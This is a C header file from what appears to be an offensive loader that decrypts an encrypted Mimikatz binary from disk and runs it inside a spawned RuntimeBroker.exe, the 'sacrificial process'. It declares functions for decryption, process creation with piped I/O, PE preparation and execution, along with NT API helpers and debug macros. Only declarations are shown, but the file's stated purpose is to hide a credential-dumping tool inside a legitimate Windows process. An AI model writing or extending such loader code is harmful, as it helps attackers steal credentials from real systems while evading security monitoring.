#pragma once
#include <stdio.h>
#include "structs.h"




/*-----------------------
 Sacrificial process
-----------------------*/
#define SPAWN_PROCESS L"C:\\Windows\\System32\\RuntimeBroker.exe"
#define PROCESS_ARGS L"-Embedding"


/*------------------------------
  Encrypted PE file on disk
------------------------------*/
#define PE_FILE "C:\\Users\\lgreenleaf\\Desktop\\mimikatz-enc.bin"
#define PE_ARGS L"coffee coffee exit"


/*-----------------------
  Debug output
-----------------------*/
#define DEBUG



/*-----------------------
  Global variables
-----------------------*/
extern NTAPIS NtAPIs;



/*-----------------------------
  Function prototypes
-----------------------------*/
//Crypt
BOOL Crypt(IN PCONTENT cnt);

//Generic
BOOL GetPE(IN PCONTENT cnt);


//Init
BOOL InitAPIs();
BOOL InitPE(IN PPEHDRS pPeHdrs, IN CONTENT cnt);


//Create process
BOOL CreateProc(IN PPROCESS_INFORMATION pProcInfo, OUT HANDLE* pStdInWritePipe, OUT HANDLE* pStdOutReadPipe);
//Prepare the PE
BOOL PreparePE(IN PROCESS_INFORMATION procInfo, IN PEHDRS PeHdrs);
//Execute the PE
BOOL ExecPE(IN PROCESS_INFORMATION procInfo, IN HANDLE stdOutRead);



/*--------------------------------------
 InitializeObjectAttributes Macro
--------------------------------------*/
#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif

/*--------------------------
  Custom memcpy function
--------------------------*/
static inline void mymemcpy(char* dst, const char* src, int size) {
    int x;
    if (src == NULL) {
        for (x = 0; x < size; x++) {
            *dst = 0x00;
            dst++;
        }
    }
    else {
        for (x = 0; x < size; x++) {
            *dst = *src;
            dst++;
            src++;
        }
    }
}


/*-----------------------------------------
  Simple marcros
-----------------------------------------*/
#ifdef DEBUG
#define DEBUG_PRINT(...) printf(__VA_ARGS__)
#define WDEBUG_PRINT(...) wprintf(__VA_ARGS__)
#else
#define DEBUG_PRINT(...) do {} while (0)
#define WDEBUG_PRINT(...) do {} while (0)
#endif
